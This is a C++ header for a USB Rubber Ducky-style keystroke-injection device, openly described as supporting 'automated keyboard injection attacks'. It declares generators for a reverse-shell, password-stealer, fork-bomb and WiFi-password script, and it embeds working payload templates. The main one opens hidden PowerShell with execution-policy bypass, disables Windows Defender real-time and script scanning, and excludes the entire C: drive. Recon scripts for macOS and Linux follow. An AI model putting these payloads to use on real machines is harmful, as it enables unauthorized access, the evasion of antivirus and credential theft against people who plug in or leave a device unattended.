/**
 * Ducky Script Parser and Executor for MCT2032
 * 
 * Implements USB Rubber Ducky compatible scripting language
 * for automated keyboard injection attacks
 */

#ifndef DUCKY_SCRIPT_H
#define DUCKY_SCRIPT_H

#include <Arduino.h>
#include <vector>
#include "USBKeyboard.h"

// Ducky Script commands
enum DuckyCommand {
    DUCKY_NONE,
    DUCKY_REM,          // Comment
    DUCKY_DEFAULT_DELAY,// Set default delay
    DUCKY_DELAY,        // Delay in milliseconds
    DUCKY_STRING,       // Type a string
    DUCKY_STRINGLN,     // Type string + ENTER
    DUCKY_PRINT,        // Same as STRING
    DUCKY_PRINTLN,      // Same as STRINGLN
    DUCKY_REPEAT,       // Repeat last command
    DUCKY_REPLAY,       // Same as REPEAT
    
    // Keys
    DUCKY_ENTER,
    DUCKY_ESCAPE,
    DUCKY_BACKSPACE,
    DUCKY_TAB,
    DUCKY_SPACE,
    DUCKY_CAPS_LOCK,
    DUCKY_DELETE,
    DUCKY_HOME,
    DUCKY_END,
    DUCKY_INSERT,
    DUCKY_PAGEUP,
    DUCKY_PAGEDOWN,
    DUCKY_PRINTSCREEN,
    DUCKY_SCROLLLOCK,
    DUCKY_BREAK,
    DUCKY_PAUSE,
    DUCKY_NUMLOCK,
    DUCKY_MENU,
    DUCKY_APP,
    
    // Function keys
    DUCKY_F1, DUCKY_F2, DUCKY_F3, DUCKY_F4,
    DUCKY_F5, DUCKY_F6, DUCKY_F7, DUCKY_F8,
    DUCKY_F9, DUCKY_F10, DUCKY_F11, DUCKY_F12,
    
    // Arrow keys
    DUCKY_UP, DUCKY_DOWN, DUCKY_LEFT, DUCKY_RIGHT,
    
    // Modifiers (can be combined)
    DUCKY_GUI, DUCKY_WINDOWS,   // Windows/Super key
    DUCKY_CTRL, DUCKY_CONTROL,
    DUCKY_ALT,
    DUCKY_SHIFT,
    DUCKY_COMMAND,              // Mac Command key
    
    // Common combos
    DUCKY_CTRL_ALT_DELETE,
    DUCKY_CTRL_SHIFT_ESCAPE,
    DUCKY_ALT_TAB,
    DUCKY_ALT_F4,
    DUCKY_GUI_R,                // Windows Run
    DUCKY_GUI_L,                // Lock screen
};

struct DuckyInstruction {
    DuckyCommand command;
    String parameter;
    std::vector<uint8_t> modifiers;
    uint8_t key;
    uint32_t delay;
    int repeatCount;
};

class DuckyScript {
private:
    USBKeyboard* keyboard;
    std::vector<DuckyInstruction> instructions;
    uint32_t defaultDelay;
    bool running;
    size_t currentInstruction;
    DuckyInstruction lastInstruction;
    
    // Parse helpers
    DuckyCommand parseCommand(const String& cmd);
    uint8_t parseKey(const String& keyName);
    std::vector<uint8_t> parseModifiers(const String& line);
    DuckyInstruction parseLine(const String& line);
    
    // Execute helpers
    void executeInstruction(const DuckyInstruction& inst);
    void executeKeyCombo(const std::vector<uint8_t>& modifiers, uint8_t key);
    
public:
    DuckyScript(USBKeyboard* kb);
    
    // Script management
    bool loadScript(const String& script);
    bool loadScriptFromFile(const char* filename);
    void clearScript();
    
    // Execution control
    void run();
    void runAsync();  // Non-blocking execution
    void stop();
    void pause();
    void resume();
    bool isRunning() const { return running; }
    
    // Progress tracking
    size_t getInstructionCount() const { return instructions.size(); }
    size_t getCurrentInstruction() const { return currentInstruction; }
    float getProgress() const;
    
    // Settings
    void setDefaultDelay(uint32_t delay) { defaultDelay = delay; }
    uint32_t getDefaultDelay() const { return defaultDelay; }
    
    // Predefined scripts
    static String getWindowsReconScript();
    static String getMacReconScript();
    static String getLinuxReconScript();
    static String getReverseShellScript(const char* ip, uint16_t port);
    static String getPasswordStealerScript();
    static String getForkBombScript();
    static String getWiFiPasswordScript();
};

// Common Ducky Script templates
namespace DuckyTemplates {
    // Windows scripts
    inline const char* WIN_DISABLE_DEFENDER = R"(
REM Disable Windows Defender
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass
ENTER
DELAY 1000
STRING Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true
ENTER
DELAY 500
STRING Add-MpPreference -ExclusionPath "C:\"
ENTER
DELAY 500
ALT F4
)";

    // macOS scripts
    inline const char* MAC_TERMINAL_RECON = R"(
REM macOS Terminal Reconnaissance
DELAY 1000
GUI SPACE
DELAY 500
STRING terminal
ENTER
DELAY 1000
STRING system_profiler SPSoftwareDataType SPHardwareDataType
ENTER
DELAY 2000
STRING ifconfig
ENTER
DELAY 1000
STRING whoami
ENTER
)";

    // Linux scripts
    inline const char* LINUX_INFO_GATHER = R"(
REM Linux Information Gathering
DELAY 1000
CTRL ALT t
DELAY 1000
STRING uname -a && lsb_release -a
ENTER
DELAY 1000
STRING ip addr show
ENTER
DELAY 1000
STRING ps aux | head -20
ENTER
)";

    // Universal scripts
    inline const char* RICKROLL = R"(
REM Rick Roll
DELAY 1000
GUI r
DELAY 500
STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ
ENTER
)";
}

#endif // DUCKY_SCRIPT_H